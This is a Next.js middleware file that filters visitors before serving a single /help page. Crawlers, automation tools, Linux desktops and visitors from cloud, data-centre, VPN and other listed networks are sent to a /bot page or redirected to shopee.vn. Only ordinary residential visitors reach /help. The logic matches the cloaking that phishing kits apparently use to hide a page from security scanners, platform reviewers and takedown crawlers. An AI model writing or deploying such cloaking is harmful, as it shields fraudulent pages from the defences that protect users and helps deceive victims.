import { NextRequest, NextResponse } from 'next/server';

const BOT_KEYWORDS = ['bot', 'spider', 'crawler', 'headl', 'headless', 'slurp', 'fetcher', 'googlebot', 'bingbot', 'yandexbot', 'baiduspider', 'twitterbot', 'ahrefsbot', 'semrushbot', 'mj12bot', 'dotbot', 'puppeteer', 'selenium', 'webdriver', 'curl', 'wget', 'python', 'scrapy', 'lighthouse', 'facebookexternalhit'];

const BLOCKED_ASN = new Set([
    // Cloud Providers
    15169, // Google Cloud
    396982, // Google Cloud / Google LLC
    32934, // Facebook
    8075, // Microsoft Azure
    16509, // Amazon AWS
    16510, // Amazon AWS
    14618, // Amazon AWS
    31898, // Oracle Corporation
    45102, // Alibaba Cloud
    55960, // Beijing Guanghuan Xinwang Digital

    // Data Centers
    198605, // GCore Labs
    201814, // Hetzner
    24940, // Hetzner Online GmbH
    51396, // Hetzner Online
    14061, // DigitalOcean
    20473, // Choopa/Vultr
    63949, // Linode
    16276, // OVH SAS
    135377, // OVH
    52925, // Ascenty Data Centers e Telecomunicações S/A
    17895, // Globalreach eBusiness Networks, Inc.
    52468, // UFINET PANAMA S.A.
    36947, // Telecom Algeria

    // VPN Providers
    212238, // Datacamp Limited
    60068, // Datacamp
    136787, // PacketHub S.A.
    62240, // Clouvider
    9009, // M247 Europe SRL
    208172, // Proton AG (ProtonVPN)
    131199, // Nexeon Technologies, Inc.
    21859, // Zenlayer Inc

    // Proxy / Hosting
    55720, // Gigabit Hosting
    397373, // Voxility
    208312, // Serverel
    37100, // SEACOM-AS

    // Other
    214961, // Netflix
    401115, // Cloudflare
    210644, // Aeza Group
    6939, // Hurricane Electric
    209 // CenturyLink
]);

const BLOCKED_UA_REGEX = new RegExp(`(${BOT_KEYWORDS.join('|')})|Linux(?!.*Android)`, 'i');

interface GeoInfo {
    asn: number;
}

const getGeoInfo = async (ip: string): Promise<GeoInfo | null> => {
    try {
        const response = await fetch(`https://get.geojs.io/v1/ip/geo/${ip}.json`, {
            signal: AbortSignal.timeout(3000)
        });

        if (!response.ok) {
            console.error('GeoJS API error:', response.status);
            return null;
        }

        const data = await response.json();
        return {
            asn: data.asn
        };
    } catch {
        return null;
    }
};

const SHOPEE_URL = 'https://shopee.vn/';

const middleware = async (req: NextRequest) => {
    const ua = req.headers.get('user-agent');
    const host = req.headers.get('x-forwarded-host') || req.headers.get('host');
    const { pathname } = req.nextUrl;

    const ip = req.headers.get('x-real-ip') || req.headers.get('x-forwarded-for')?.split(',')[0].trim() || 'unknown';

    if (!ua || BLOCKED_UA_REGEX.test(ua)) {
        return NextResponse.rewrite(`https://${host}/bot`);
    }

    if (ip !== 'unknown') {
        const geoInfo = await getGeoInfo(ip);
        if (geoInfo) {
            if (geoInfo.asn && BLOCKED_ASN.has(geoInfo.asn)) {
                return NextResponse.redirect(SHOPEE_URL);
            }
        }
    }

    if (pathname === '/') {
        return NextResponse.redirect(SHOPEE_URL);
    }

    return NextResponse.next();
};

export default middleware;

export const config = {
    matcher: ['/', '/help']
};
